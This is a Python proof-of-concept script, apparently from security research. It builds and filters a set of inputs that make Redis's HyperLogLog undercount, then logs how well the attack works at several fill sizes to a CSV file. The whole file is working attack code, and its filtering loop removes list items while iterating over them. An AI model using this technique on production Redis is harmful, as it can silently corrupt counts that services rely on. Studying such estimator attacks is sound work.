import redis
import random
import csv

# Setup our redis connection. It's on the VM, so local is fine.
pool = redis.ConnectionPool(host="127.0.0.1", port=6379, db=0)
r = redis.Redis(connection_pool=pool)

# Define variables
a = [] #Attack Vector
PointOfSwitch = 40960 # R = 16384 // switch at 2'5 * m = 40960
nF = 5 # Number of filtering passes
sizeA = 25000 # Desired size of initial (unfiltered) attack vector
PoC = [40960, 61440, 81920, 102400, 122880]

# Auxiliary variables
a_aux = []
results = []

#Create the csv
with open('PoCSuccess.csv', 'w', newline='') as csvfile:
    fieldnames = ['PoC', 'success1', 'success2', 'success3', 'success4', 'success5', 'average', 'percent average']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()

for capture in PoC:
    print("PoC: " + str(capture))
    a.clear()
    results.clear()
    # Find elements for attack vector A
    while len(a) < sizeA:
        r.delete('test')
        x = 0
        # Fill the HLL
        while (r.pfcount('test') < capture):
            r.pfadd('test', str(x))
            x = x + 1
        aux = x + random.randint(0, 10000000)
        for i in range(1, 20000):
            c_ant = r.pfcount('test')
            r.pfadd('test', str(aux))
            c_new = r.pfcount('test');
            if c_new == c_ant:
                a.append(aux)
            aux = aux + 1
    print("Construction made.")

    for filter in range(nF):
        r.delete('test')
        random.shuffle(a)
        y = random.randint(0, 10000000)
        while (r.pfcount('test') < capture):
            r.pfadd('test', str(y))
            y = y + 1
        for x in a:
            c_ant = r.pfcount('test');
            r.pfadd('test', str(x))
            # Remove elements that increase the HLL estimate
            c_new = r.pfcount('test');
            if c_new != c_ant:
                a.remove(x);

    print("Filtering made.")
    # Test the filtered set 5 times
    for i in range(5):
        r.delete('test1')

        y = random.randint(0, 10000000)
        limit = int(81920)
        s = random.randint(40960, limit)
        while (r.pfcount('test1') < s):
            r.pfadd('test1', str(y))
            y = y + 1

        # Insert elements in a
        for x in a:
            r.pfadd('test1', str(x))

        res = (s + len(a)) - r.pfcount('test1')
        results.append(res)
        finalLen = len(a)

    print("Tests made")
    print("-----------------------------------------------------")
    # Add the new row for the csv
    average = sum(results) / len(results)
    with open('PoCSuccess.csv', 'a', newline='') as csvfile:
        fieldnames = ['PoC', 'success1', 'success2', 'success3', 'success4', 'success5', 'average',
                      'percent average']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writerow({'PoC': str(capture), 'success1': str(results[0]), 'success2': str(results[1]),
                         'success3': str(results[2]),
                         'success4': str(results[3]), 'success5': str(results[4]), 'average': str(average),
                         'percent average': str((average / len(a)) * 100)})
